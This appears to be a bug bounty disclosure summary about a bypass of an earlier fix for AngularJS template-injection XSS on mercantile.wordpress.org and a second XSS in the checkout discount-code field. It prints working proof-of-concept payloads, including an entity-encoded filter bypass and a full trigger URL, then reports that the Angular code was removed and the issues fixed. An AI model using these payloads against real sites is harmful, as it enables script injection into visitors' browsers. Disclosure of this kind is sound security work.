Summary:
@zee_shan found a bypass for #230234. Payload used :
```
&#123;&#123;constructor.constructor('alert(document.domain)')()}}
```
URL to trigger XSS :
https://mercantile.wordpress.org/?s=%26%23123%3B%26%23123%3Bconstructor.constructor%28%27alert%28document.domain%29%27%29%28%29%7D%7D&post_type=product

-----
Soon after another XSS issue on the /checkout endpoint:
mercantile.wordpress.org/checkout/

` Have a discount code? Enter it here` is vulnerable. You can use this payload to trigger XSS:
`{{constructor.constructor(&#39;alert(document.domain)&#39;)()}}`

-----

Due to a collection of similar reports and @zee_shan's findings we did a full audit on the site that resulted in ripping out all of the Angular code and replacing it with other solutions, which took several months to complete. During that time a bounty was awarded and when when it was completed @zee_shan confirmed that the issues were fixed and they saw no additional bypasses.

Full disclosure was requested by WordPress, but @zee_shan preferred partial disclosure with a summary.
